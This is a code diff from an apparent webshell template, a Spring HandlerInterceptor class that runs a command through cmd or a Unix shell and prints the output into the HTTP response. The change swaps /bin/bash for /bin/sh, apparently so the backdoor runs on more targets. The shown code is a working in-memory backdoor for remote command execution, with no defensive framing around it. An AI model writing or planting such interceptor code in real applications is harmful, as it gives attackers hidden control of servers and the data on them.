@@ -109,7 +109,7 @@ public class SpringInterceptorTemplate extends HandlerInterceptorAdapter {
                         if (System.getProperty("os.name").toLowerCase().contains("win")) {
                             cmds = new String[]{"cmd", "/c", cmd};
                         } else {
-                            cmds = new String[]{"/bin/bash", "-c", cmd};
+                            cmds = new String[]{"/bin/sh", "-c", cmd};
                         }
                         String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                         ((ResponseFacade) lastResponse).getWriter().println(result);
